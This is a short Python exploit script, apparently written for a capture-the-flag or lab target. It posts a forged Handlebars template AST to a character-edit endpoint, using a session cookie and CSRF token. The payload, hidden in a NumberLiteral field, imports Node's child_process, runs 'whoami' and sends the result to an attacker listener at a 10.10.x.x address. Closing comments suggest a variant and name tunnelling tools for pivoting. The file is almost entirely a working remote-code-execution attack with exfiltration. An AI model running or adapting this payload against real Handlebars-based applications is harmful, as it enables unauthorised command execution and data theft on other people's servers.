import requests

url = 'http://starofus.xyz/character/15'
headers = {'Content-Type': 'application/json'
    ,'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0'
    ,'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    ,'Cookie': 'dz.sid=s%3AZ6KJ8brLjwGhlJYCLo72yP53BwnsCh4f.S6RTbUgXEU9Jj5zzA%2FmE1jDYXtzv5aHY0frdKqMGxTY'
    ,'Origin': 'http://starofus.xyz'
    ,'Referer': 'http://starofus.xyz/character/15/edit'
}

data={ '_csrf':'2602d56a5888a7447f2491feaffceee60c0fef87d3e134cf86ed063c7a594feb',
        'name':'aaa',
        'race':'bb',
        'class':'cc',
        'backstory':'dd',
        'campaign_message': {
        'type': 'Program',
        'body': [
        {
            'type': 'MustacheStatement',
            'path': {
            'type': 'PathExpression',
            'data': False,
            'depth': 0,
            'parts': ['lookup'],
            'original': 'lookup',
            'loc': None
            },
            'params': [
            {
                'type': 'PathExpression',
                'data': False,
                'depth': 0,
                'parts': [],
                'original': 'this',
                'loc': None
            },
            {
                'type': 'NumberLiteral',
                'value': "{},{})) + (async function(){var a='';try { cp = await import('node:child_process');a=cp.execFileSync('whoami');fetch('http://10.10.17.229:4444?a='+a);}catch(e){a=e} return a})() //",
                'original': 1,
                'loc': None
            }
            ],
            'escaped': True,
            'strip': { 'open': False, 'close': False },
            'loc': None
        }
        ]
    }
    }
    
response = requests.post(url, headers=headers, json=data)

print(response.text)

# process.mainModule.require('child_process') # is much better
# For pivot 
# chisel https://github.com/jpillora/chisel
# proxychain https://github.com/haad/proxychains